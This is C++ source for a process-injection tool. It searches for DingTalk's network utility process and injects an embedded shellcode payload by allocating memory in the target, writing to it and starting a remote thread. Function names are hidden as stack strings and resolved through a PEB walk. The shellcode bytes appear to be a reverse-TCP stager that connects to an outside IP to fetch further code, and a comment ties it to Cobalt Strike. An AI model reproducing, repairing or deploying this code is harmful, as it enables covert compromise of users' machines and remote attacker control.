#include "peb-lookup.h"

// It's worth noting that strings can be defined nside the .text section:
#pragma code_seg(".text")

__declspec(allocate(".text"))
wchar_t kernel32_str[] = L"kernel32.dll";


__declspec(allocate(".text"))
char load_lib_str[] = "LoadLibraryA";

using myNtQuerySystemInformation = DWORD(WINAPI*)(
	DWORD SystemInformationClass,
	PVOID  SystemInformation,
	ULONG  SystemInformationLength,
	PULONG ReturnLength);

using myNtQueryInformationProcess = DWORD(WINAPI*)(
	HANDLE ProcessHandle,
	ULONG ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength);

typedef LPVOID(WINAPI *FN_VirtualAllocEx)(
	_In_ HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
	);
typedef BOOL(WINAPI *FN_WriteProcessMemory)(
	_In_ HANDLE hProcess,
	_In_ LPVOID lpBaseAddress,
	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
	);
typedef HANDLE(WINAPI *FN_CreateRemoteThread)(
	_In_ HANDLE hProcess,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ SIZE_T dwStackSize,
	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_ LPVOID lpParameter,
	_In_ DWORD dwCreationFlags,
	_Out_opt_ LPDWORD lpThreadId
	);

int main()
{
	// Stack based strings for libraries and functions the shellcode needs
	// this shellcode will be inject into utility process of dingtalk, compiled by run_cs_mem
	unsigned char shellcode[] =
	{ 0xfc, 0xe8, 0x8f, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30
	, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff
	, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x49
	, 0x75, 0xef, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78
	, 0x85, 0xc0, 0x74, 0x4c, 0x01, 0xd0, 0x50, 0x8b, 0x58, 0x20, 0x8b, 0x48, 0x18, 0x01, 0xd3
	, 0x85, 0xc9, 0x74, 0x3c, 0x31, 0xff, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xc0, 0xc1
	, 0xcf, 0x0d, 0xac, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24
	, 0x75, 0xe0, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c
	, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59
	, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xe9, 0x80, 0xff, 0xff, 0xff, 0x5d
	, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c, 0x77, 0x26
	, 0x07, 0x89, 0xe8, 0xff, 0xd0, 0xb8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54, 0x50, 0x68
	, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x68, 0xac, 0x10, 0x3b, 0x85, 0x68, 0x02
	, 0x00, 0x04, 0xd2, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xea
	, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56, 0x57, 0x68, 0x99, 0xa5, 0x74, 0x61
	, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0xff, 0x4e, 0x08, 0x75, 0xec, 0xe8, 0x67, 0x00, 0x00
	, 0x00, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83
	, 0xf8, 0x00, 0x7e, 0x36, 0x8b, 0x36, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6a
	, 0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x6a, 0x00, 0x56, 0x53, 0x57
	, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x68, 0x00
	, 0x40, 0x00, 0x00, 0x6a, 0x00, 0x50, 0x68, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x68
	, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x5e, 0x5e, 0xff, 0x0c, 0x24, 0x0f, 0x85, 0x70, 0xff
	, 0xff, 0xff, 0xe9, 0x9b, 0xff, 0xff, 0xff, 0x01, 0xc3, 0x29, 0xc6, 0x75, 0xc1, 0xc3, 0xbb
	, 0xf0, 0xb5, 0xa2, 0x56, 0x6a, 0x00, 0x53, 0xff, 0xd5 }; 
	wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
	char ntdll_name[] = { 'n','t','d','l','l','.','d','l','l',0 };

	wchar_t dingtalk[] = { 'd', 'i', 'n', 'g', 't', 'a', 'l', 'k', '.', 'e', 'x', 'e', 0 };
	wchar_t dingtalk_upper[] = { 'D', 'I', 'N', 'G', 'T', 'A', 'L', 'K', '.', 'E', 'X', 'E', 0 };
	wchar_t dingtalk_pattern[] = { '-', '-', 'u', 't', 'i', 'l', 'i', 't', 'y', '-', 's', 'u', 'b', '-', 't', 'y', 'p', 'e', '=', 'n', 'e', 't', 'w', 'o', 'r', 'k', 0 };

	char load_lib_name[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
	char get_proc_name[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
	char open_process_name[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
	char get_module_handlea_name[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
	char get_current_process_name[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
	char virtual_alloc_name[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
	char virtual_free_name[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
	char read_process_memory_name[] = { 'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char nt_query_system_information_name[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 0 };
	char nt_query_information_process_name[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };


	char VirtualAllocEx_name[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
	char CreateRemoteThread_name[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };
	char WriteProcessMemory_name[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };


	// resolve kernel32 image base
	LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
	if (!base) {
		return 1;
	}

	// resolve loadlibraryA() address
	LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);
	if (!load_lib) {
		return 1;
	}

	// resolve getprocaddress() address
	LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);
	if (!get_proc) {
		return 1;
	}

	// loadlibrarya and getprocaddress function definitions
	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
		= (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

	HANDLE(WINAPI * _OpenProcess)(
		DWORD dwDesiredAccess,
		BOOL  bInheritHandle,
		DWORD dwProcessId) = (HANDLE(WINAPI*)(
			DWORD dwDesiredAccess,
			BOOL  bInheritHandle,
			DWORD dwProcessId)) _GetProcAddress((HMODULE)base, open_process_name);

	HMODULE(WINAPI * _GetModuleHandleA)(
		LPCSTR lpModuleName) = (HMODULE(WINAPI*)(
			LPCSTR lpModuleName)) _GetProcAddress((HMODULE)base, get_module_handlea_name);

	HANDLE(WINAPI * _GetCurrentProcess)() = (HANDLE(WINAPI*)()) _GetProcAddress((HMODULE)base, get_current_process_name);

	LPVOID(WINAPI * _VirtualAlloc)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect) = (LPVOID(WINAPI*)(
			LPVOID lpAddress,
			SIZE_T dwSize,
			DWORD  flAllocationType,
			DWORD  flProtect)) _GetProcAddress((HMODULE)base, virtual_alloc_name);

	LPVOID(WINAPI * _VirtualFree)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  dwFreeType) = (LPVOID(WINAPI*)(
			LPVOID lpAddress,
			SIZE_T dwSize,
			DWORD  dwFreeType)) _GetProcAddress((HMODULE)base, virtual_free_name);

	BOOL(WINAPI * _ReadProcessMemory)(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		LPVOID  lpBuffer,
		SIZE_T  nSize,
		SIZE_T * lpNumberOfBytesRead
		) = (BOOL(WINAPI*)(
			HANDLE  hProcess,
			LPCVOID lpBaseAddress,
			LPVOID  lpBuffer,
			SIZE_T  nSize,
			SIZE_T * lpNumberOfBytesReade)) _GetProcAddress((HMODULE)base, read_process_memory_name);

	myNtQuerySystemInformation fNtQuerySystemInformation = (myNtQuerySystemInformation)(_GetProcAddress(_GetModuleHandleA(ntdll_name), nt_query_system_information_name));
	myNtQueryInformationProcess fNtQueryInformationProcess = (myNtQueryInformationProcess)(_GetProcAddress(_GetModuleHandleA(ntdll_name), nt_query_information_process_name));
	FN_CreateRemoteThread fn_CreateRemoteThread = (FN_CreateRemoteThread)_GetProcAddress((HMODULE)base, CreateRemoteThread_name);
	FN_VirtualAllocEx fn_VirtualAllocEx = (FN_VirtualAllocEx)_GetProcAddress((HMODULE)base, VirtualAllocEx_name);
	FN_WriteProcessMemory fn_WriteProcessMemory = (FN_WriteProcessMemory)_GetProcAddress((HMODULE)base, WriteProcessMemory_name);

	// find dingtalk utility process
	LPVOID pInfo = _VirtualAlloc(NULL, 0x100000, 0x1000, 0x4);
	if (!pInfo) {
		return 1;
	}
	ULONG uReturnedLEngth = 0;
	LONG status = fNtQuerySystemInformation(0x5, pInfo, 0x100000, &uReturnedLEngth);
	if (status != 0) {
		return 1;
	}
	PSYSTEM_PROCESS_INFORMATION pSystemInformation = (PSYSTEM_PROCESS_INFORMATION)pInfo;

	PWCHAR pImageName = (PWCHAR) * (DWORD*)((PCHAR)pSystemInformation + 0x3c);
	DWORD dwID = (DWORD)pSystemInformation->UniqueProcessId;
	HANDLE hProcess = NULL;
	PROCESS_BASIC_INFORMATION pbi;
	RTL_USER_PROCESS_PARAMETERS Param;
	USHORT usCmdLen = 0;
	USHORT usPathLen = 0;
	DWORD dwPatternLength = 26;
	DWORD dwNetWorkInstPID = 0;

	int nImageNameLength = 0;

	// list all process
	while (true) {
		if (pSystemInformation->NextEntryOffset == 0) {
			break;
		}
		pSystemInformation = (PSYSTEM_PROCESS_INFORMATION)((PCHAR)pSystemInformation + pSystemInformation->NextEntryOffset);
		pImageName = (PWCHAR) * (DWORD*)((PCHAR)pSystemInformation + 0x3c);
		for (nImageNameLength = 0; pImageName[nImageNameLength] != 0; nImageNameLength++);
		if (nImageNameLength != 12) {
			continue;
		}
		BOOL isDingtalk = TRUE;
		for (int nIndex = 0; nIndex < nImageNameLength; nIndex++) {
			if (pImageName[nIndex] != dingtalk[nIndex] && pImageName[nIndex] != dingtalk_upper[nIndex]) {
				isDingtalk = FALSE;
				break;
			}
		}

		if (!isDingtalk) {
			continue;
		}

		// dingtalk instance , now get command line of this process
		dwID = (DWORD)pSystemInformation->UniqueProcessId;
		hProcess = _OpenProcess(0x400 | 0x10, FALSE, dwID);
		LONG status2 = fNtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
		if (status2 != 0)
		{
			continue;
		}
		PEB peb;
		for (int nPebIndex = 0; nPebIndex < sizeof(peb); nPebIndex++) {
			((BYTE*)&peb)[nPebIndex] = 0x00;
		}
		RTL_USER_PROCESS_PARAMETERS Param;
		for (int nParamIndex = 0; nParamIndex < sizeof(Param); nParamIndex++) {
			((BYTE*)&Param)[nParamIndex] = 0x00;
		}
		USHORT usCmdLen = 0;
		USHORT usPathLen = 0;
		DWORD dwRead = 0;
		_ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &dwRead);
		if (!dwRead) {
			continue;
		}
		dwRead = 0;
		_ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), &dwRead);
		if (!dwRead) {
			continue;
		}
		if (Param.CommandLine.Length == 0) {
			continue;
		}
		DWORD dwBufferLength = Param.CommandLine.MaximumLength * sizeof(wchar_t);
		wchar_t *pCmdLine = (wchar_t *)_VirtualAlloc(NULL, dwBufferLength, 0x1000, 0x4);
		if (!pCmdLine) {
			continue;
		}
		for (DWORD nByteIndex = 0; nByteIndex < dwBufferLength; nByteIndex++) {
			((byte*)pCmdLine)[nByteIndex] = 0;
		}
		dwRead = 0;
		_ReadProcessMemory(hProcess, Param.CommandLine.Buffer, pCmdLine, Param.CommandLine.Length, &dwRead);
		if (!dwRead) {
			continue;
		}
		wchar_t * pIndexOfCmdLine = pCmdLine;

		// match the command line of dingtalk, check if this is the network instance 
		while (*pIndexOfCmdLine) {
			BOOL bMatch = TRUE;
			for (DWORD nCount = 0; nCount < dwPatternLength; nCount++) {
				if (pIndexOfCmdLine[nCount] != dingtalk_pattern[nCount]) {
					bMatch = FALSE;
					break;
				}
			}
			if (bMatch) {
				dwNetWorkInstPID = dwID;
				break;
			}
			pIndexOfCmdLine++;
		}
		_VirtualFree((LPVOID)pCmdLine, dwBufferLength, 0x8000);
		if (dwNetWorkInstPID != 0) {
			break;
		}
	}
	_VirtualFree(pInfo, 0x100000, 0x8000);
	//network instance not found, failed
	if (!dwNetWorkInstPID) {
		return 1;
	}

	HANDLE TargetProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwNetWorkInstPID);
	LPVOID AllocMemory = fn_VirtualAllocEx(TargetProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);
	fn_WriteProcessMemory(TargetProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);
	fn_CreateRemoteThread(TargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocMemory, NULL, 0, NULL);	//问题出在这里, 和注入dll文件的程序入口点在loadlibrary不同, 要设置到shellcode开头.

	/*
	typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, *PUNICODE_STRING;
	typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
	typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *PCLIENT_ID;
	using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
	*/

	return 0;
}
